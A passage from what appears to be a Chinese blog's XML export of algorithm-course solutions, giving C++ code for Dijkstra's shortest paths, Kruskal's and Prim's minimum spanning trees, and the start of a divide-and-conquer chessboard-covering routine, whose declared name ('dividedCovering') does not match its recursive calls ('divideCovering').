	priority_queue<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">></span><span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token punctuation">,</span> greater<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">></span> q<span class="token punctuation">;</span>
	<span class="token comment">// 初始化最短路径</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		dist<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>start<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
		q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>dist<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> i <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>second<span class="token punctuation">;</span> <span class="token comment">// 贪心选择最近结点i</span>
		q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		visited<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// 结点i最短路径已得到</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 利用结点i进行松弛操作</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>visited<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span> <span class="token comment">// 结点j已得到最短路径，无需松弛</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> INT32_MAX <span class="token operator">&amp;&amp;</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> INT32_MAX
				<span class="token operator">&amp;&amp;</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> dist<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				dist<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 松弛操作</span>
				pre<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span> <span class="token comment">// 更新前驱结点</span>
				q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>dist<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 加入优先队列</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token comment">// 打印源点到各结点的最短路径</span>
	stack<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> s<span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> start<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> INT32_MAX<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			cout <span class="token operator">&lt;&lt;</span> <span class="token string">"inf"</span> <span class="token operator">&lt;&lt;</span> <span class="token string">": "</span> <span class="token operator">&lt;&lt;</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>start<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"->"</span> <span class="token operator">&lt;&lt;</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			cout <span class="token operator">&lt;&lt;</span> dist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">": "</span> <span class="token operator">&lt;&lt;</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>start<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"->"</span><span class="token punctuation">;</span>
			<span class="token keyword">int</span> x <span class="token operator">=</span> pre<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
			<span class="token keyword">while</span> <span class="token punctuation">(</span>x <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				s<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
				x <span class="token operator">=</span> pre<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				cout <span class="token operator">&lt;&lt;</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"->"</span><span class="token punctuation">;</span>
				s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			cout <span class="token operator">&lt;&lt;</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h1><h2 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/09/02/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/mst.png"></p>
<h2 id="解题代码-4"><a href="#解题代码-4" class="headerlink" title="解题代码"></a>解题代码</h2><h3 id="Kruskal"><a href="#Kruskal" class="headerlink" title="Kruskal"></a>Kruskal</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">Kruskal</span><span class="token punctuation">(</span>MGraph<span class="token operator">&amp;</span> G<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 边集，元素为&lt;权值weight，起点u，终点v></span>
	vector<span class="token operator">&lt;</span>tuple<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span> edges<span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> INT32_MAX<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token comment">// 将边加入边集</span>
				edges<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token comment">// 对边集按权值大小进行升序排序</span>
	<span class="token function">sort</span><span class="token punctuation">(</span>edges<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> edges<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 简单并查集，father[x]存放x的父结点</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">father</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 寻找x所在集合的父结点（所在连通分量编号）</span>
	<span class="token keyword">auto</span> findFather <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> f <span class="token operator">=</span> father<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>f <span class="token operator">!=</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			x <span class="token operator">=</span> f<span class="token punctuation">;</span>
			f <span class="token operator">=</span> father<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">return</span> f<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		father<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span> <span class="token comment">// 初始父结点为自身</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 已找到的边个数</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> cnt <span class="token operator">&lt;=</span> n <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> edges<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">auto</span> <span class="token punctuation">[</span>weight<span class="token punctuation">,</span> u<span class="token punctuation">,</span> v<span class="token punctuation">]</span> <span class="token operator">=</span> edges<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">int</span> fu <span class="token operator">=</span> <span class="token function">findFather</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">int</span> fv <span class="token operator">=</span> <span class="token function">findFather</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// 若u和v父结点相同（即u和v位于一个连通分量中），若选择加入边uv，则会导致回路</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>fu <span class="token operator">!=</span> fv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			cout <span class="token operator">&lt;&lt;</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" - "</span> <span class="token operator">&lt;&lt;</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" : "</span> <span class="token operator">&lt;&lt;</span> weight <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
			father<span class="token punctuation">[</span>fu<span class="token punctuation">]</span> <span class="token operator">=</span> fv<span class="token punctuation">;</span> <span class="token comment">// 两个连通分量合并为一个</span>
			<span class="token operator">++</span>cnt<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="Prim"><a href="#Prim" class="headerlink" title="Prim"></a>Prim</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">Prim</span><span class="token punctuation">(</span>MGraph<span class="token operator">&amp;</span> G<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// minDist[i]表示结点i距离MST最近距离</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">minDist</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> INT32_MAX<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// connected[i]表示在MST中与结点i相连的结点</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">connected</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 表示结点i是否已加入MST</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token function">visited</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	visited<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token comment">// 初始化最近距离</span>
		minDist<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token comment">// 寻找距离MST的最近结点k</span>
		<span class="token keyword">int</span> minVal <span class="token operator">=</span> INT32_MAX<span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> minDist<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> minVal<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				minVal <span class="token operator">=</span> minDist<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
				k <span class="token operator">=</span> j<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token comment">// 将结点k加入MST中</span>
		visited<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
		cout <span class="token operator">&lt;&lt;</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>connected<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" - "</span> <span class="token operator">&lt;&lt;</span> G<span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" : "</span> <span class="token operator">&lt;&lt;</span> minVal <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
		<span class="token comment">// 更新minDist数组和connected数组</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> minDist<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				minDist<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> G<span class="token punctuation">.</span>edges<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
				connected<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>算法分析与设计编程题 递归与分治策略</title>
    <url>/2023/08/26/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E9%80%92%E5%BD%92%E4%B8%8E%E5%88%86%E6%B2%BB%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<h1 id="棋盘覆盖"><a href="#棋盘覆盖" class="headerlink" title="棋盘覆盖"></a>棋盘覆盖</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="/2023/08/26/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E9%80%92%E5%BD%92%E4%B8%8E%E5%88%86%E6%B2%BB%E7%AD%96%E7%95%A5/chess1.png"></p>
<p><img src="/2023/08/26/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E9%80%92%E5%BD%92%E4%B8%8E%E5%88%86%E6%B2%BB%E7%AD%96%E7%95%A5/chess2.png"></p>
<h2 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// para: 棋盘，行偏移，列偏移，特殊行，特殊列</span>
<span class="token keyword">void</span> <span class="token function">dividedCovering</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span><span class="token operator">&amp;</span> chessBoard<span class="token punctuation">,</span> <span class="token keyword">int</span> dr<span class="token punctuation">,</span> <span class="token keyword">int</span> dc<span class="token punctuation">,</span> <span class="token keyword">int</span> sr<span class="token punctuation">,</span> <span class="token keyword">int</span> sc<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
	size <span class="token operator">/=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// 划分为四部分</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>sr <span class="token operator">&lt;</span> dr <span class="token operator">+</span> size <span class="token operator">&amp;&amp;</span> sc <span class="token operator">&lt;</span> dc <span class="token operator">+</span> size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 特殊点位于左上部分</span>
		<span class="token function">divideCovering</span><span class="token punctuation">(</span>chessBoard<span class="token punctuation">,</span> dr<span class="token punctuation">,</span> dc<span class="token punctuation">,</span> sr<span class="token punctuation">,</span> sc<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> nr <span class="token operator">=</span> dr <span class="token operator">+</span> size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> nc <span class="token operator">=</span> dc <span class="token operator">+</span> size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 新覆盖点</span>
		chessBoard<span class="token punctuation">[</span>nr<span class="token punctuation">]</span><span class="token punctuation">[</span>nc<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token function">divideCovering</span><span class="token punctuation">(</span>chessBoard<span class="token punctuation">,</span> dr<span class="token punctuation">,</span> dc<span class="token punctuation">,</span> nr<span class="token punctuation">,</span> nc<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>sr <span class="token operator">&lt;</span> dr <span class="token operator">+</span> size <span class="token operator">&amp;&amp;</span> sc <span class="token operator">>=</span> dc <span class="token operator">+</span> size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 特殊点位于右上部分</span>
		<span class="token function">divideCovering</span><span class="token punctuation">(</span>chessBoard<span class="token punctuation">,</span> dr<span class="token punctuation">,</span> dc <span class="token operator">+</span> size<span class="token punctuation">,</span> sr<span class="token punctuation">,</span> sc<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> nr <span class="token operator">=</span> dr <span class="token operator">+</span> size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> nc <span class="token operator">=</span> dc <span class="token operator">+</span> size<span class="token punctuation">;</span>
		chessBoard<span class="token punctuation">[</span>nr<span class="token punctuation">]</span><span class="token punctuation">[</span>nc<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token function">divideCovering</span><span class="token punctuation">(</span>chessBoard<span class="token punctuation">,</span> dr<span class="token punctuation">,</span> dc <span class="token operator">+</span> size<span class="token punctuation">,</span> nr<span class="token punctuation">,</span> nc<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>sr <span class="token operator">>=</span> dr <span class="token operator">+</span> size <span class="token operator">&amp;&amp;</span> sc <span class="token operator">&lt;</span> dc <span class="token operator">+</span> size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 特殊点位于左下部分</span>
		<span class="token function">divideCovering</span><span class="token punctuation">(</span>chessBoard<span class="token punctuation">,</span> dr <span class="token operator">+</span> size<span class="token punctuation">,</span> dc<span class="token punctuation">,</span> sr<span class="token punctuation">,</span> sc<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> nr <span class="token operator">=</span> dr <span class="token operator">+</span> size<span class="token punctuation">,</span> nc <span class="token operator">=</span> dc <span class="token operator">+</span> size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
		chessBoard<span class="token punctuation">[</span>nr<span class="token punctuation">]</span><span class="token punctuation">[</span>nc<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token function">divideCovering</span><span class="token punctuation">(</span>chessBoard<span class="token punctuation">,</span> dr <span class="token operator">+</span> size<span class="token punctuation">,</span> dc<span class="token punctuation">,</span> nr<span class="token punctuation">,</span> nc<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>sr <span class="token operator">>=</span> dr <span class="token operator">+</span> size <span class="token operator">&amp;&amp;</span> sc <span class="token operator">>=</span> dc <span class="token operator">+</span> size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 特殊点位于右下部分</span>
		<span class="token function">divideCovering</span><span class="token punctuation">(</span>chessBoard<span class="token punctuation">,</span> dr <span class="token operator">+</span> size<span class="token punctuation">,</span> dc <span class="token operator">+</span> size<span class="token punctuation">,</span> sr<span class="token punctuation">,</span> sc<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> nr <span class="token operator">=</span> dr <span class="token operator">+</span> size<span class="token punctuation">,</span> nc <span class="token operator">=</span> dc <span class="token operator">+</span> size<span class="token punctuation">;</span>
